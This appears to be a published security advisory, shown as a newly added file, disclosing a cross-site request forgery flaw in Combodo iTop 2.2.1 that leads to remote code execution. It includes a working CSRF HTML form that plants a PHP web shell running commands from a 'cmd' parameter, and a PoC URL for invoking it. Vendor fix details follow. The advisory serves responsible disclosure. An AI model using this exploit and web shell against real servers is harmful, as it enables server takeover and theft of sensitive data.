@@ -1,0 +1,68 @@
+Advisory ID: HTB23293
+Product: iTop
+Vendor: Combodo
+Vulnerable Version(s): 2.2.1 and probably prior
+Tested Version: 2.2.1
+Advisory Publication:  February 10, 2016  [without technical details]
+Vendor Notification: February 10, 2016 
+Vendor Patch: February 11, 2016 
+Public Disclosure: March 18, 2016 
+Vulnerability Type: Cross-Site Request Forgery [CWE-352]
+Risk Level: High 
+CVSSv3 Base Score: 7.1 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L]
+Solution Status: Fixed by Vendor
+Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge Security Research Lab discovered a Remote Code Execution vulnerability in iTop that is exploitable via Cross-Site Request Forgery flaw that is also present in the application. The vulnerability exists due to absence of validation of HTTP request origin in "/env-production/itop-config/config.php" script, as well as lack of user-input sanitization received via "new_config" HTTP POST parameter. 
+
+A remote unauthenticated attacker can perform CSRF attack and execute arbitrary PHP code on the vulnerable system with privileges of the web server. Successful exploitation of the vulnerability may allow an attacker to execute arbitrary system commands on the web server, gain complete access to vulnerable web application and its databases that may contain very sensitive information. 
+
+The attacker shall create a malicious web page with CSRF exploit code, trick a logged-in administrator to visit the page, spoof the HTTP request as if it was coming from the legitimate user, and permanently inject malicious PHP code into iTop configuration file.
+
+CSRF exploit will inject the following PHP code into iTop configuration file:
+
+<? if(isset($_GET['cmd'])) die(passthru($_GET['cmd'])); ?> 
+
+To reproduce the vulnerability, just create an empty HTML file and paste the following CSRF exploit code into it:
+
+
+<form action="http://[host]/env-production/itop-config/config.php?c%5Bmenu%5D=ConfigEditor" method="post" name="main">
+<input type="hidden" name="operation" value="save">
+<input type="hidden" name="prev_config" value="1">
+<input type="hidden" name="new_config" value="<? if(isset($_GET['cmd'])) die(passthru($_GET['cmd'])); ?>">
+<input value="submit" id="btn" type="submit" />
+</form>
+
+
+Then login to iTop website with admin account and open the file in your browser. 
+
+After successful exploitation an attacker can run arbitrary system commands using the "/pages/UI.php" script. This simple PoC will execute "/bin/ls" directory listing command: 
+
+http://[host]/pages/UI.php?cmd=ls
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Replace the file datamodels/2.x/itop-config/config.php by the version from the appropriate revision from SVN, then run the setup again.
+
+More Information:
+https://sourceforge.net/p/itop/tickets/1202/
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23293 - https://www.htbridge.com/advisory/HTB23293  - RCE via CSRF in iTop
+[2] iTop - http://www.combodo.com - iTop: open source ITIL ITSM Software.
+[3] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.
+[4] ImmuniWeb® - https://www.htbridge.com/immuniweb/ - web security platform by High-Tech Bridge for on-demand and continuous web application security, vulnerability management, monitoring and PCI DSS compliance.
+[5] Free SSL/TLS Server test - https://www.htbridge.com/ssl/ - check your SSL implementation for PCI DSS and NIST compliance. Supports all types of protocols.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
